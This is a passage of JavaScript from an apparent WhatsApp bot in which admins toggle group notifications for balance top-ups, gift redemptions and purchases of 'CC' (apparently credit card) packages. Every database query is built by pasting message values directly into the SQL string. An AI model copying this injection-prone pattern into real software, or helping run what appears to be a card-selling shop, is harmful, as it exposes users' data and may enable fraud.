                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NÃO IREI MAIS TE ELOGIAR NO GRUPO*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'ELOGIAR'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                return
            } else if (msg[1] === "1") {
                Texto = `*TODA VEZ QUE TE MENCIONAREM VOU TE ELOGIAR COM UMA FRASE BANCANA E ALEATÓRIA*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'ELOGIAR'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ativarnotifgeral===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*TODAS AS NOTIFICAÇÕES DE GRUPOS FORAM PAUSADAS. ⏹️*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'ATIVAR_NOTIFICACOES'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "1") {
                Texto = `*TODAS AS NOTIFICAÇÕES DE GRUPOS FORAM REATIVADAS. ⏸️*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'ATIVAR_NOTIFICACOES'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfpix===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE SALDO ADICIONADO DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_ADD_SALDO'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE SALDO ADICIONADO ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_ADD_SALDO'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfregistro===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE NOVO USUÁRIO REGISTRADO DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_REGISTRO'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE NOVO USUÁRIO REGISTRADO ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_REGISTRO'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfgift===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE GIFT RESGATADO DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_RESGATAR_GIFT'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE GIFT RESGATADO ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_RESGATAR_GIFT'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfbuycc===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE CC COMPRADA DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_COMPROU_CC'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE CC COMPRADA ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_COMPROU_CC'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfbuyccmix===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE PACOTE MIX DE CC COMPRADO DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_COMPROU_CC_MIX'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE PACOTE MIX DE CC COMPRADO ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_COMPROU_CC_MIX'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

